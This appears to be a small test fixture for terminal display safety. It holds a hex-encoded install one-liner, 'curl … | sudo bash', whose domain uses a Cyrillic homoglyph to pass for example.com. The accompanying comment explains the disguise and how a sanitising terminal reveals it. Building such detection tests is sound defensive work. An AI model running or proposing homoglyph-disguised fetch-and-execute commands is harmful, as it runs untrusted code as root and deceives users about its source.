# HEX ONLY (read-safe). display-deception canary: a realistic install one-liner
# whose domain carries a Cyrillic homoglyph (a -> U+0430), so it READS as
# 'example.com' but the bytes are a different, attacker-registrable IDN. A
# neutralizing terminal strips/marks the non-ASCII code point (ex_mple.com or
# ex<U+0430 CYRILLIC SMALL LETTER A>mple.com), breaking the disguise.
63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 73 3a 2f 2f 65 78 d0 b0 6d 70 6c
65 2e 63 6f 6d 2f 67 65 74 2e 73 68 20 7c 20 73 75 64 6f 20 62 61 73 68
